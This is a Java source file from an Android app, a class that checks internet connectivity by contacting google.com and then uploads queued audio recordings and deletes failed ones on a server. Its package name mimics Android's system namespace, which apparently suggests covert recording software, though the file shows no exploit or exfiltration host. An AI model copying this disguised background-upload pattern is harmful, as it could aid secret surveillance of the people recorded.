package com.android.network.detect;

import android.content.Context;
import android.content.ContextWrapper;
import android.os.AsyncTask;
import android.util.Log;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;


public class CheckInternetAndUpload extends ContextWrapper implements Runnable {
    int status = 0;
    String mCurrentFile;
    private UploadRecordingTaskHelpers mUploadHelpers;
    private UploadRecordingTask uploadRecordingTask;
    private Context mContext;
    private RecordingDatabaseHelper recordingDatabaseHelper;
    private String LOG_TAG = AppGlobals.getLogTag(getClass());
    static boolean sUploadingPrevious = false;

    void setCurrentUplaodFile(String item) {
        mCurrentFile = item;
    }

    public CheckInternetAndUpload(Context base) {
        super(base);
        mContext = base;
    }

    @Override
    public void run() {
        try {
            URL url = new URL("http://google.com");
            HttpURLConnection urlc = (HttpURLConnection) url.openConnection();
            urlc.setConnectTimeout(3000);
            urlc.connect();
            if (urlc.getResponseCode() == 200) {
                if (mCurrentFile != null) {
                    ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(mCurrentFile));
                    new UploadRecordingTask(getApplicationContext()).execute(arrayList);
                }
                handlingInternetConnectivity();
            }
        } catch (MalformedURLException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        } catch (IOException e) {
            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
                    (getApplicationContext());
            if (mCurrentFile != null) {
                recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, mCurrentFile);
            }

        }
    }

    void handlingInternetConnectivity() {
        recordingDatabaseHelper = new RecordingDatabaseHelper(mContext);
        mUploadHelpers = new UploadRecordingTaskHelpers(mContext);
        if (mUploadHelpers.isNetworkAvailable()) {
            Log.i(LOG_TAG, "Ping success");
            deletePreviousUploadFailFileOnServer();
        }
    }

    /*delete the previous data or broken files on server first*/
    private void deletePreviousUploadFailFileOnServer() {
        uploadRecordingTask = new UploadRecordingTask(mContext);
        ArrayList<String> listToBeDelete = recordingDatabaseHelper.
                retrieveDate(SqliteHelpers.COULMN_DELETE);
        ArrayList<String> listToUpload = recordingDatabaseHelper.
                retrieveDate(SqliteHelpers.COULMN_UPLOAD);
        Log.i(LOG_TAG,"Running Upload task....");
        Log.i(LOG_TAG, "" + listToUpload.size());
        Log.i(LOG_TAG, "" + listToBeDelete.size());
        if (listToBeDelete.size() > 0) {
            Log.i(LOG_TAG, "to be delete");
            new Task().execute(listToBeDelete);
        }
        if (listToUpload.size() > 0) {
            Log.i(LOG_TAG, "to be upload");
            sUploadingPrevious = true;
            new UploadRecordingTask(mContext).execute(listToUpload);
        }
    }

    class Task extends AsyncTask<ArrayList<String>, String, String> {

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            uploadRecordingTask = new UploadRecordingTask(mContext);
            uploadRecordingTask.deletePreviousUploadFailedRecordings(params[0]);
            return null;
        }
    }
}
